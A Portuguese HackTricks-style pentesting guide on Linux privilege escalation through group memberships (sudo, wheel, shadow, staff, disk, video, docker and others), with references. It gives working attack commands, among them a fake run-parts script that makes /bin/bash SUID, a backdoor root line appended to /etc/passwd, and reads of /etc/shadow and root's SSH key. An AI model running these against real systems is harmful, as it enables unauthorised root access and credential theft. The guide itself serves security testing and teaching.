# Grupos Sudo/Admin - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Grupos Sudo/Admin

### **PE - Method 1**

**Às vezes**, a política **/etc/sudoers** de um sistema (ou um arquivo incluído nela) contém entradas como:<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Isso significa que qualquer usuário correspondido por qualquer uma das entradas pode executar qualquer comando como qualquer usuário-alvo por meio do `sudo` (sujeito ao restante da política).<sup>[[3]](#references)</sup>

Se esse for o caso, para **se tornar root, basta executar**:
```
sudo su
```
### PE - Method 2

Encontre todos os binários suid e verifique se existe o binário **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Se **pkexec é um binário SUID**, ele pode executar um programa como outro usuário somente quando o polkit autoriza a ação solicitada; o bit SUID, por si só, não garante acesso root. Verifique a política instalada e a autorização da sessão-alvo em vez de presumir que ser membro de **sudo** ou **admin** seja suficiente.<sup>[[4]](#references)[[5]](#references)</sup>

Em distribuições que ainda usam o backend Local Authority antigo, inspecione suas regras de grupo com:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Os nomes e padrões dos grupos relevantes variam conforme a distribuição; um grupo só é útil aqui se a política local o nomear.<sup>[[5]](#references)</sup>

Para **se tornar root, você pode executar**:
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
Se você tentar executar **pkexec** e receber este **erro**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
Em uma sessão SSH sem um authentication agent registrado, `pkexec` pode falhar com este erro mesmo quando a policy permitiria a ação; o polkit documenta `pkttyagent` como um agente de autenticação de texto para sessões que não são de desktop. O comportamento exato depende da versão e da distribuição, portanto verifique a policy local e a configuração do agente. Uma solução alternativa relatada para versões afetadas do NixOS usa **2 sessões SSH diferentes**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Grupo Wheel

Às vezes, uma política do sudoers também pode conter esta entrada:
```
%wheel	ALL=(ALL:ALL) ALL
```
Isso significa que qualquer usuário correspondido pela entrada pode executar qualquer comando como qualquer usuário-alvo por meio do `sudo` (sujeito ao restante da política).<sup>[[3]](#references)</sup>

Se esse for o caso, para **se tornar root, basta executar**:
```
sudo su
```
## Grupo shadow

Em sistemas cujas permissões concedem esse acesso, usuários do grupo **shadow** podem **ler** **/etc/shadow**; verifique o modo e as ACLs reais no alvo:<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Então, leia o arquivo e tente **quebrar alguns hashes**.

Observação rápida sobre o estado de bloqueio ao fazer a triagem dos hashes:
- Entradas com `!` ou `*` geralmente não são interativas para logins com senha.
- `!hash` significa que a senha foi bloqueada; os caracteres restantes representam o campo de senha antes do bloqueio.
- Um campo contendo `*` não é um hash `crypt(3)` válido e impede o login com senha UNIX; não deduza a partir dele se uma senha foi definida anteriormente.
Isso é útil para a classificação de contas mesmo quando o login direto está bloqueado.<sup>[[6]](#references)</sup>

## Grupo Staff

**staff**: Permite que os usuários adicionem modificações locais ao sistema (`/usr/local`) sem precisar de privilégios de root (observe que os executáveis em `/usr/local/bin` estão na variável PATH de qualquer usuário e podem "substituir" os executáveis em `/bin` e `/usr/bin` com o mesmo nome). Compare com o grupo "adm", que está mais relacionado ao monitoramento/segurança.<sup>[[2]](#references)[[7]](#references)</sup>

Em configurações Debian nas quais `/usr/local/bin` precede `/usr/bin` em `PATH` (como nos exemplos abaixo), um comando não qualificado resolve primeiro para a cópia em `/usr/local/bin`; confirme o `PATH` efetivo no alvo.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Se um processo privilegiado resolver um comando não qualificado por meio de um `/usr/local/bin` gravável, substituir esse comando poderá executá-lo com os privilégios do processo; confirme o caminho real e o gatilho antes de testar.

Em sistemas Ubuntu, o `pam_motd` executa scripts por meio de `run-parts --lsbsysinit` como root no login; jobs do cron também podem usar `run-parts`, mas isso depende da distribuição e da configuração.<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
Em um novo login SSH, `pspy` pode ajudar a confirmar se esse caminho é realmente invocado no alvo; ele pode observar as linhas de comando dos processos sem privilégios de root.<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Grupo disk

A associação ao grupo **disk** pode conceder acesso bruto a dispositivos de bloco e geralmente está **próxima do acesso root**; a Debian descreve isso como praticamente equivalente a root, mas verifique as permissões reais dos dispositivos e o layout de armazenamento no alvo.<sup>[[7]](#references)</sup>

Os caminhos comuns de dispositivos incluem `/dev/sd*`, mas NVMe e outros layouts de armazenamento usam nomes diferentes.
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs` opera em sistemas de arquivos ext2/ext3/ext4; caminhos como `/root` e `/etc/shadow` acima são arquivos dentro do sistema de arquivos aberto, enquanto o segundo argumento de `dump` é um caminho de saída no sistema de arquivos nativo.<sup>[[8]](#references)</sup> Por exemplo, isto extrai `/tmp/asd1.txt` do sistema de arquivos aberto para `/tmp/asd2.txt` no sistema de arquivos nativo:
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
A opção `-w` abre o sistema de arquivos para leitura e gravação, e o comando `write` copia um arquivo nativo para o sistema de arquivos aberto. Evite usá-la em um sistema de arquivos ativo montado, pois edições diretas podem corromper o sistema de arquivos; quando possível, trabalhe a partir de uma imagem offline.<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Grupo de vídeo

Usando o comando `w`, você pode descobrir **quem está conectado ao sistema**, e ele exibirá uma saída como a seguinte.<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
A entrada **tty1** identifica o primeiro console virtual do Linux; por si só, ela não prova que um usuário esteja fisicamente presente na máquina, especialmente em contêineres ou outros ambientes.<sup>[[21]](#references)</sup>

Em sistemas que expõem um dispositivo framebuffer legível, a associação ao grupo **video** pode conceder acesso a esse dispositivo. A interface de framebuffer do Linux documenta `/dev/fb0` como um dispositivo de memória legível que pode ser copiado para obter uma captura da tela; o caminho `/sys/class/graphics/fb0/virtual_size` está disponível apenas onde esse atributo sysfs do fbdev está presente, portanto, verifique o alvo primeiro.<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Se a versão instalada do **GIMP** expuser um importador de dados brutos, abra o **`screen.raw`** com esse importador; o suporte e os controles variam conforme a versão e o plug-in.<sup>[[22]](#references)</sup>

![Disk Group - Video Group: Para abrir a imagem bruta, você pode usar o GIMP, selecionar o arquivo screen.raw e selecionar Raw image data como tipo de arquivo](<../../../images/image (463).png>)

Defina a Largura e a Altura da imagem para corresponder à geometria do framebuffer; tente os formatos de pixel/Tipos de imagem disponíveis até que a saída esteja legível.<sup>[[9]](#references)</sup>

![Disk Group - Video Group: Em seguida, modifique a Largura e a Altura para as usadas na tela e verifique diferentes Tipos de imagem (e selecione aquele que exibe melhor a tela)](<../../../images/image (317).png>)

## Grupo root

A associação ao grupo **root** não fornece o UID de root, mas arquivos graváveis pelo grupo pertencentes a `root` ainda podem ser interessantes quando serviços ou bibliotecas privilegiados os consumirem. Verifique as permissões reais do arquivo e como ele é usado antes de considerá-lo um caminho de privilege-escalation.

**Verifique quais arquivos os membros de root podem modificar**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Grupo Docker

Ser membro do grupo `docker` concede acesso de nível root ao daemon do Docker em instalações rootful padrão. Como os bind mounts são de leitura e gravação por padrão, um usuário que possa controlar esse daemon pode montar o `/` do host em um container e alterar arquivos do host; isso efetivamente concede root no host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
Finalmente, se você não gostar de nenhuma das sugestões anteriores, ou se elas não estiverem funcionando por algum motivo (docker api firewall?), você sempre pode tentar **executar um container privilegiado e escapar dele**, conforme explicado aqui:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Se você tiver permissões de escrita sobre o socket do docker, leia [**este post sobre como escalar privilégios abusando do socket do docker**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Grupo lxc/lxd

{{#ref}}
./
{{#endref}}

## Grupo Adm

Normalmente, **membros** do grupo **`adm`** têm permissões para **ler arquivos de log** localizados dentro de _/var/log/_.\
Portanto, se você comprometeu um usuário dentro desse grupo, definitivamente deve **verificar os logs**.<sup>[[7]](#references)</sup>

## Grupos Backup / Operator / lp / Mail

Esses grupos têm significados específicos de acordo com o serviço e a distribuição. O Debian documenta `backup` para backup/restauração delegados, `lp` para daemons de impressora e `mail` para `/var/mail`; portanto, verifique as permissões locais antes de considerar a associação como um caminho de privilégio.<sup>[[7]](#references)</sup>

Eles geralmente são vetores de **credential-discovery**, em vez de vetores diretos para root:
- **backup**: pode expor arquivos compactados com configurações, chaves, dumps de DB ou tokens.
- **operator**: acesso operacional específico da plataforma que pode vazar dados confidenciais de runtime.
- **lp**: filas/spools de impressão podem conter o conteúdo de documentos.
- **mail**: spools de e-mail podem expor links de redefinição, OTPs e credenciais internas.

Considere a associação a esses grupos como uma descoberta de exposição de dados de alto valor e faça pivot por meio da reutilização de senhas/tokens.

## Grupo Auth

No OpenBSD, quando o S/Key está configurado, `/etc/skey` pertence a `root:auth`, e o acesso aos seus registros requer o grupo `auth`; os registros do YubiKey são armazenados em `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Uma configuração vulnerável do OpenBSD 6.6 com S/Key ou YubiKey habilitado permitia que usuários locais com privilégios `auth` se tornassem root; a Qualys documenta o pré-requisito e a cadeia de exploração, e o PoC vinculado a implementa.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [autenticação de pkexec/pkttyagent sem uma sessão GUI (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Manual de Referência do polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Manual de Referência do polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — página do manual do Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Manual de Proteção do Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — página do manual do Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [O dispositivo Frame Buffer — documentação do Linux Kernel](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — snooping de processos Linux sem privilégios](https://github.com/DominicBreuker/pspy)
- [13] [Segurança do Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Gerenciar o Docker como um usuário não root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Executando containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — páginas do manual do OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — páginas do manual do OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Vulnerabilidades de autenticação no OpenBSD — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC de exploit local](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — página do manual do Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Dispositivos alocados do Linux (versão 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Importação e exportação de imagens — documentação do GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
